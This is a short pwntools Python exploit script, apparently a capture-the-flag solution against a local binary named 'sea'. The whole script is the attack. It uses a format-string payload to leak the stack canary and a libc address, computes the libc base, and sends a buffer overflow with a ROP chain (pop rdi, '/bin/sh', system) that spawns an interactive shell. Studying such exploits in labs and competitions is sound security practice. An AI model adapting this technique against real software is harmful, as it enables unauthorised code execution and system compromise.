from pwn import *

io = process("./sea")

elf = ELF("./sea")
libc = ELF("./libc.so.6")


context.gdb_binary = "/usr/bin/pwndbg"
_libc_main_addr_got = elf.got["__libc_start_main"]

offset = 8

system_got_addr = libc.symbols["system"]


payload = b"%21$p*%23$p*"

io.recvuntil(b"[Remaining Attempts: 2] > ")
io.send(payload)
canary = int(io.recvuntil(b"*")[:-1], 16)
bu_addr = int(io.recvuntil(b"*")[:-1], 16)
libc_base_addr = bu_addr - 0x24083

system_func_addr = libc_base_addr + system_got_addr

print("canary: ", hex(canary))
print("base addr: ", hex(libc_base_addr))
print("system_func_addr: ", hex(system_func_addr))

bin_sh_addr = libc_base_addr + next(libc.search(b"/bin/sh\x00"))
print("/bin/sh address: ", hex(bin_sh_addr))
system_addr = libc_base_addr + libc.symbols["system"]
print("system address: ", hex(system_addr))
pop_rdi_addr = 0x23B6A
pop_rdi_addr += libc_base_addr
ret_addr = 0x22679
ret_addr += libc_base_addr

print("pop rdi address: ", hex(pop_rdi_addr))
print("ret address: ", hex(ret_addr))

payload = (
    b"a" * (0x70 - 8)
    + p64(canary)
    + b"a" * 8
    + b"b" * 8
    + p64(ret_addr)
    + p64(pop_rdi_addr)
    + p64(bin_sh_addr)
    + p64(system_addr)
)
gdb.attach(io)
io.send(payload)
io.interactive()
